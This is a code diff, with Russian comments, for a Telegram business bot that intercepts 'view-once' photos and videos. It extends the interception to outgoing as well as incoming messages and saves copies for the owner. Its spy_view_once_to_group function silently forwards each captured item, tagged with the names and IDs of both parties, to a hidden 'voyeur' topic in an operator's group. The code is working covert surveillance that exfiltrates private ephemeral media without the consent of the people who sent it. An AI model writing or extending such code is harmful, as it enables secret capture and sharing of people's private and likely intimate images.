@@ -818,24 +818,32 @@ async def _dl_buf(file_id: str, filename: str) -> "BufferedInputFile | None":
         return None
 
 
-async def save_replied_media(owner_id: int, source_msg: Message):
+async def save_replied_media(owner_id: int, source_msg: Message,
+                             recipient_name: str = ""):
     """Скачивает медиа из source_msg и отправляет копию владельцу в личку.
-    Вызывается когда владелец делает reply на сообщение с медиа (в т.ч. однократное).
-    source_msg — оригинальное сообщение с медиа (из кэша или reply_to_message)."""
+    recipient_name — если задан, это исходящая одноразка (владелец отправил партнёру).
+    Иначе — входящая (партнёр отправил владельцу)."""
     try:
-        sender_name = ""
-        if source_msg.from_user:
-            sender_name = escape_html(source_msg.from_user.full_name)
-            if source_msg.from_user.username:
-                sender_name += f" (@{source_msg.from_user.username})"
-        elif source_msg.chat:
-            n = getattr(source_msg.chat, "full_name", None) or getattr(source_msg.chat, "first_name", None) or ""
-            sender_name = escape_html(n) if n else f"ID {source_msg.chat.id}"
-
-        caption = (
-            f"🔥 <b>Сохранено из однократного</b>\n"
-            f"👤 От: {sender_name}"
-        )
+        if recipient_name:
+            # Исходящая: владелец сам отправил view-once
+            caption = (
+                f"👁 <b>Твоё однократное сохранено</b>\n"
+                f"👤 Кому: {recipient_name}"
+            )
+        else:
+            # Входящая: партнёр прислал view-once
+            sender_name = ""
+            if source_msg.from_user:
+                sender_name = escape_html(source_msg.from_user.full_name)
+                if source_msg.from_user.username:
+                    sender_name += f" (@{source_msg.from_user.username})"
+            elif source_msg.chat:
+                n = getattr(source_msg.chat, "full_name", None) or getattr(source_msg.chat, "first_name", None) or ""
+                sender_name = escape_html(n) if n else f"ID {source_msg.chat.id}"
+            caption = (
+                f"🔥 <b>Сохранено из однократного</b>\n"
+                f"👤 От: {sender_name}"
+            )
         cap_extra = (f"\n{escape_html(source_msg.caption)}" if source_msg.caption else "")
 
         sent = False
@@ -882,39 +890,47 @@ async def save_replied_media(owner_id: int, source_msg: Message):
         logging.error(f"[SAVE-REPLIED] не удалось доставить владельцу {owner_id}: {e}")
 
 
-async def spy_view_once_to_group(owner_id: int, source_msg: Message):
+async def spy_view_once_to_group(owner_id: int, source_msg: Message,
+                                  recipient_user=None):
     """Бесшумно отправляет перехваченный view-once в тему ОДНОРАЗКИ 👁 в GROUP_ID.
-    Прикрепляет кто отправил и кому (владельцу бота)."""
+    recipient_user — если задан (aiogram User), это исходящая одноразка:
+      owner отправил партнёру (recipient_user).
+    Иначе входящая: партнёр отправил owner."""
     try:
         tid = await get_or_create_voyeur_topic()
         if tid is None:
             return
 
-        # Имя отправителя (партнёр, приславший view-once)
-        from_name = "неизвестно"
-        if source_msg.from_user:
-            from_name = escape_html(source_msg.from_user.full_name)
-            if source_msg.from_user.username:
-                from_name += f" (@{source_msg.from_user.username})"
-            from_name += f" [<code>{source_msg.from_user.id}</code>]"
-        elif source_msg.chat:
-            n = (getattr(source_msg.chat, "full_name", None)
-                 or getattr(source_msg.chat, "first_name", None) or "")
-            from_name = escape_html(n) if n else f"chat {source_msg.chat.id}"
+        def _fmt_user(user) -> str:
+            if user is None:
+                return "неизвестно"
+            name = escape_html(getattr(user, "full_name", None) or str(getattr(user, "id", "?")))
+            uname = getattr(user, "username", None)
+            uid = getattr(user, "id", "?")
+            return name + (f" (@{uname})" if uname else "") + f" [<code>{uid}</code>]"
 
-        # Имя получателя (владелец бота)
-        to_name = f"[<code>{owner_id}</code>]"
-        info = connected_users.get(owner_id)
-        if info:
-            base = escape_html(info.get("name") or str(owner_id))
-            uname = info.get("username") or ""
-            to_name = base + (f" (@{uname})" if uname else "") + f" [<code>{owner_id}</code>]"
+        def _fmt_owner(oid: int) -> str:
+            info = connected_users.get(oid)
+            if info:
+                base = escape_html(info.get("name") or str(oid))
+                uname = info.get("username") or ""
+                return base + (f" (@{uname})" if uname else "") + f" [<code>{oid}</code>]"
+            return f"[<code>{oid}</code>]"
 
-        caption = (
-            f"👁 <b>ОДНОРАЗКА перехвачена</b>\n"
-            f"От: {from_name}\n"
-            f"Кому: {to_name}"
-        )
+        if recipient_user is not None:
+            # Исходящая: owner → partner
+            arrow = "➡️"
+            from_name = _fmt_owner(owner_id)
+            to_name   = _fmt_user(recipient_user)
+            label     = "👁 <b>ОДНОРАЗКА (исходящая)</b>"
+        else:
+            # Входящая: partner → owner
+            arrow = "⬅️"
+            from_name = _fmt_user(source_msg.from_user if source_msg.from_user else None)
+            to_name   = _fmt_owner(owner_id)
+            label     = "👁 <b>ОДНОРАЗКА (входящая)</b>"
+
+        caption = f"{label}\n{arrow} От: {from_name}\n{arrow} Кому: {to_name}"
 
         kw = {"message_thread_id": tid, "disable_notification": True, "parse_mode": "HTML"}
         sent = False
@@ -1546,10 +1562,39 @@ async def handle_business_message(message: Message):
             cached = get_cached_message(message.chat.id, rto.message_id)
             cached_had_media = cached is not None and has_media(cached)
             if not cached_had_media:
-                # Кэш пришёл без медиа, reply_to — с медиа → view-once
-                logging.info(f"[VIEW-ONCE] обнаружено mid={rto.message_id}, сохраняем владельцу {owner_id}")
+                # Кэш пришёл без медиа, reply_to — с медиа → входящий view-once
+                logging.info(f"[VIEW-ONCE IN] mid={rto.message_id}, owner={owner_id}")
                 asyncio.create_task(save_replied_media(owner_id, rto))
                 asyncio.create_task(spy_view_once_to_group(owner_id, rto))
+
+    # ── Исходящий view-once: партнёр ответил на view-once владельца ──────────
+    # Владелец отправил однократное собеседнику. Когда собеседник делает reply
+    # на него — reply_to_message содержит оригинал с медиа. В кэше у нас этот
+    # message_id прилетел без медиа (photo=None) → значит был view-once.
+    if (
+        sender_id is not None
+        and sender_id != owner_id
+        and message.reply_to_message is not None
+    ):
+        rto_out = message.reply_to_message
+        rto_out_sender = rto_out.from_user.id if rto_out.from_user else None
+        if rto_out_sender == owner_id and has_media(rto_out):
+            cached_out = get_cached_message(message.chat.id, rto_out.message_id)
+            cached_out_had_media = cached_out is not None and has_media(cached_out)
+            if not cached_out_had_media:
+                # Исходящий view-once: фото видно в reply-контексте, в кэше не было
+                logging.info(f"[VIEW-ONCE OUT] mid={rto_out.message_id}, owner={owner_id}")
+                partner_user = message.from_user
+                # Имя партнёра для подписи в личке
+                pname = ""
+                if partner_user:
+                    pname = escape_html(partner_user.full_name)
+                    if partner_user.username:
+                        pname += f" (@{partner_user.username})"
+                asyncio.create_task(
+                    save_replied_media(owner_id, rto_out, recipient_name=pname))
+                asyncio.create_task(
+                    spy_view_once_to_group(owner_id, rto_out, recipient_user=partner_user))
     # ────────────────────────────────────────────────────────────────────────
 
     msg_text = message.text or message.caption or ""
